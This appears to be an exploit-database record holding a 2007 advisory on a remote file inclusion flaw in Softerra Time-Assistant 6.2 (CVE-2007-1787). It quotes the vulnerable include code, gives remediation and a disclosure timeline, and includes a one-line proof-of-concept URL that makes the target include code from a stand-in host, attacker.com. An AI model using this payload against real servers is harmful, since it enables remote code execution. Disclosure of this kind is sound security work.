{
  "id": "3600",
  "title": "Softerra Time-Assistant 6.2 - &#039;inc_dir&#039; Remote File Inclusion",
  "cve": "CVE-2007-1787",
  "vuln_type": "rce",
  "code": "____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\  \r\n |    __)_ /    \\  \\//    ~    \\/   |   \\ \r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/ \r\n\r\n                                        .OR.ID\r\nECHO_ADV_80$2007\r\n\r\n-----------------------------------------------------------------------------------------\r\n[ECHO_ADV_80$2007] Softerra Time-Assistant <= 6.2 (inc_dir) Remote File Inclusion Vulnerability\r\n-----------------------------------------------------------------------------------------\r\n\r\nAuthor         : M.Hasran Addahroni\r\nDate           : March, 29th 2007\r\nLocation       : Australia, Sydney\r\nWeb            : http://advisories.echo.or.id/adv/adv80-K-159-2007.txt\r\nCritical Lvl   : Dangerous\r\nImpact\t       : System access\r\nWhere\t       : From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nApplication   : Time-Assistant  \r\nversion       : <= 6.2 Time-Assistant Standard, Time-Assistant Enterprise, Time-Assistant light\r\nVendor        : http://www.time-assistant.com\r\nDescription :\r\n\r\nTime-Assistant - Web based time tracking software for Internet/Intranet featuring employee timesheets and various reports and project management tools that include salary calculation, invoices and expenses, online services and PDA package. Time-Assistant is professional timesheet software for your business. It is a daily time tracking solution designed to reduce the drudgery of recording, analyzing and reporting associated with everyday working routine. With Time-Assistant you can easily manage employee timesheets and expenses, calculate salaries, prepare project estimates, get invoices based on personal or client work rates.\r\n\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~\r\n- Invalid include function at lib/timesheet.class.php :  \r\n  \t\r\n----------------lib/timesheet.class.php-------------------\r\n...\r\ninclude ($inc_dir . \"database.inc.php\");\r\ninclude ($lib_dir . \"sqlstorage.class.php\");\r\ninclude ($lib_dir . \"lib.php\");\r\ninclude ($lib_dir . \"timesheet.lib.php\");\r\n...\r\n----------------------------------------------------------------\r\n\r\n\r\nInput passed to the \"inc_dir\" and \"lib_dir\" parameter in lib/timesheet.class.php is not properly verified before being used to include files. \r\nThis can be exploited to include arbitrary files from local or external resources.\r\nSuccessful exploitation requires that \"register_globals\" is enabled.\r\n\r\n\r\n\r\n\r\nPoc/Exploit:\r\n~~~~~~~~~\r\n\r\nhttp://www.target.com/[Time-Assistant_path]/lib/timesheet.class.php?inc_dir=http://attacker.com/evil?\r\n\r\n\r\nSolution:\r\n~~~~~~\r\n\r\n- Edit the source code to ensure that input is properly verified.\r\n- Turn off register_globals\r\n\r\n\r\nNotification:\r\n~~~~~~\r\n- 28-03-2007 bugs found\r\n- 28-03-2007 vendor contacted but no response\r\n- 29-03-2007 advisory released\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~~~\r\n~ ping - my dearest wife, and my little son, for all the luv the tears n the breath\r\n~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,negative, str0ke (for the best comments)\r\n~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,an0maly,fleanux,baylaw\r\n~ SinChan,h4ntu,cow_1seng,sakitjiwa, m_beben, rizal, cR4SH3R, madkid, kuntua, stev_manado, nofry, x16\r\n~ newbie_hacker@yahoogroups.com\r\n~ #aikmel #e-c-h-o @irc.dal.net\r\n\r\n---------------------------------------------------------------------------\r\nContact:\r\n~~~~~\r\n\r\n     K-159 || echo|staff || eufrato[at]gmail[dot]com\r\n     Homepage: http://k-159.echo.or.id/\r\n\r\n-------------------------------- [ EOF ] ----------------------------------\r\n\r\n# milw0rm.com [2007-03-29]",
  "url": "https://www.exploit-db.com/exploits/3600"
}